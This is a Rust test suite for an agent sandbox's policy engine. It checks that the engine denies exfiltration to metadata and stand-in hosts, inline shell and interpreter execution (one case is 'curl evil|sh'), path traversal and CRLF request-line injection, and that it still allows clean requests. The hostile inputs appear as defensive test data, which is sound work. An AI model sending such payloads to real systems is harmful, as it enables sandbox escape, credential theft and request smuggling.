//! Escape suite v1 (I1/I6): every exfil path must be denied + audited at Tier0.
//! Real KVM tests run nightly; these run every commit without privs.
use toolcage_policy as policy;

fn sample() -> policy::Policy {
    policy::load_yaml(include_str!("../../../schemas/policy-v0.yaml")).unwrap()
}

fn net(host: &str) -> policy::Request {
    policy::Request {
        action: "http.request".into(),
        host: Some(host.into()),
        method: Some("GET".into()),
        path: Some("/".into()),
        fs_path: None,
        argv: None,
    }
}

#[test]
fn raw_exfil_paths_blocked() {
    let p = sample();
    // Raw/packet/DNS/ICMP/IPv6/metadata have no proxy path -> default deny.
    for h in [
        "169.254.169.254",
        "metadata.google.internal",
        "instance-data",
        "evil.example.com",
        "dns-tunnel.example.com",
    ] {
        let d = policy::decide(&p, &net(h));
        assert!(!d.allow, "{h} must be denied");
    }
}

#[test]
fn proxy_alias_cannot_smuggle_host() {
    // Guest asking for alias "github" with evil path must still be path-checked.
    let p = sample();
    let d = policy::decide(
        &p,
        &policy::Request {
            action: "http.request".into(),
            host: Some("github".into()),
            method: Some("POST".into()),
            path: Some("/repos/evil/x".into()),
            fs_path: None,
            argv: None,
        },
    );
    assert!(!d.allow);
}

#[test]
fn shell_and_interpreter_inline_blocked() {
    let p = sample();
    // Shells with any inline-command flag (-c, -lc, -cic, ...) are denied,
    // not just the old exact `-c`/`-lc` match.
    for argv in [
        vec!["bash".to_string(), "-ic".to_string(), "id".to_string()],
        vec!["dash".to_string(), "-c".to_string(), "id".to_string()],
        vec!["zsh".to_string(), "-c".to_string(), "id".to_string()],
        vec!["ksh".to_string(), "-c".to_string(), "id".to_string()],
        vec![
            "/bin/busybox".to_string(),
            "sh".to_string(),
            "-c".to_string(),
            "id".to_string(),
        ],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.clone()),
            },
        );
        assert!(!d.allow, "{argv:?} must be denied");
    }
    // Interpreters fed inline code are denied.
    for (bin, flag, code) in [
        ("python", "-c", "print(1)"),
        ("python3", "-c", "print(1)"),
        ("perl", "-e", "print 1"),
        ("ruby", "-e", "puts 1"),
        ("node", "-e", "console.log(1)"),
        ("lua", "-e", "print(1)"),
        ("php", "-r", "echo 1;"),
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(vec![bin.to_string(), flag.to_string(), code.to_string()]),
            },
        );
        assert!(!d.allow, "{bin} {flag} must be denied");
    }
}

#[test]
fn shell_and_interpreter_bypasses_blocked() {
    let p = sample();
    let denied = |argv: Vec<&str>| {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.iter().map(|s| s.to_string()).collect()),
            },
        );
        assert!(!d.allow, "{argv:?} must be denied");
    };
    // Joined inline-code flag (`python3 -cprint(1)`, `perl -e'code'`).
    denied(vec!["python3", "-cprint(1)"]);
    denied(vec!["perl", "-e'print 1'"]);
    denied(vec!["php", "-r'echo 1;"]);
    // Versioned / renamed binaries (`python3.12`, `perl5`, `bash5`).
    denied(vec!["python3.12", "-c", "print(1)"]);
    denied(vec!["perl5", "-e", "print 1"]);
    denied(vec!["bash5", "-c", "id"]);
    // Shell reached through `env` (argv[0] is not itself a shell).
    denied(vec!["env", "sh", "-c", "curl evil|sh"]);
    denied(vec!["env", "bash5", "-c", "id"]);
    // A shell script file is the same risk class as `sh -c`.
    denied(vec!["sh", "evil.sh"]);
    denied(vec!["bash", "script.sh"]);
    denied(vec!["/bin/busybox", "sh", "evil.sh"]);
}

#[test]
fn shell_flags_without_inline_code_allowed() {
    let p = sample();
    // Options that don't run a string must not be false-positively denied.
    for argv in [
        vec!["bash".to_string(), "--noprofile".to_string()],
        vec!["bash".to_string(), "-x".to_string()],
        vec!["/bin/ls".to_string(), "-la".to_string()],
        vec!["python".to_string(), "script.py".to_string()],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.clone()),
            },
        );
        assert!(d.allow, "{argv:?} must be allowed");
    }
}

#[test]
fn shell_escape_blocked() {
    let p = sample();
    for argv in [
        vec!["sh".to_string(), "-c".to_string(), "id".to_string()],
        vec!["/bin/bash".to_string(), "-lc".to_string(), "id".to_string()],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv),
            },
        );
        assert!(!d.allow);
    }
}

fn at(host: &str, method: &str, path: &str) -> policy::Request {
    policy::Request {
        action: "http.request".into(),
        host: Some(host.into()),
        method: Some(method.into()),
        path: Some(path.into()),
        fs_path: None,
        argv: None,
    }
}

#[test]
fn request_target_traversal_denied() {
    // `github` allows /repos/acme/app/**. A traversal that matches that prefix
    // as a string but resolves outside it upstream must be refused before any
    // rule matching — otherwise the rule that is checked is not the resource
    // that gets served.
    let p = sample();
    for path in [
        "/repos/acme/app/../../../orgs/evil/repos",
        "/repos/acme/app/../../..",
        "/repos/acme/app/./../other",
        "/repos/acme/app/%2e%2e/%2e%2e/evil",
        "/repos/acme/app/%2E%2E/evil",
        "/repos/acme/app/%2fetc",
        "/repos/acme/app/x%5c..%5cevil",
        // absolute-form target: not rooted where it claims to be
        "https://evil.example.com/repos/acme/app/x",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(!d.allow, "traversal target must be denied: {path}");
        assert_eq!(d.rule_ids, vec!["deny:request-target".to_string()], "{path}");
    }
}

#[test]
fn request_line_injection_denied() {
    // The method and path are written verbatim into the upstream request line.
    // A CR/LF/NUL/space there injects headers or a second request on the
    // connection that carries the broker-injected Authorization header.
    let p = sample();
    for path in [
        "/repos/acme/app/x HTTP/1.1\r\nX-Injected: 1\r\n\r\nGET /smuggled",
        "/repos/acme/app/x\r\nX-Injected: 1",
        "/repos/acme/app/x\nX-Injected: 1",
        "/repos/acme/app/x\0/extra",
        "/repos/acme/app/x name",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(!d.allow, "injected target must be denied: {path:?}");
        assert_eq!(d.rule_ids, vec!["deny:request-target".to_string()]);
    }
    for method in ["GET / HTTP/1.1\r\nX: 1", "GET\r\nX: 1", "GET POST", "GE\0T", ""] {
        let d = policy::decide(&p, &at("github", method, "/repos/acme/app/x"));
        assert!(!d.allow, "injected method must be denied: {method:?}");
        assert_eq!(d.rule_ids, vec!["deny:request-target".to_string()]);
    }
}

#[test]
fn clean_request_target_still_allowed() {
    // The hygiene check must not break legitimate traffic.
    let p = sample();
    for path in [
        "/repos/acme/app",
        "/repos/acme/app/",
        "/repos/acme/app/pulls/12",
        // A query string is a legal request target; the upstream does not
        // resolve it as a path, so it stays allowed (and its own separators
        // are not traversal).
        "/repos/acme/app/pulls?state=open",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(d.allow, "clean target must be allowed: {path} ({d:?})");
    }
    // POST is allowed by the rule (approval is enforced above policy).
    assert!(policy::decide(&p, &at("github", "POST", "/repos/acme/app/x")).allow);
}
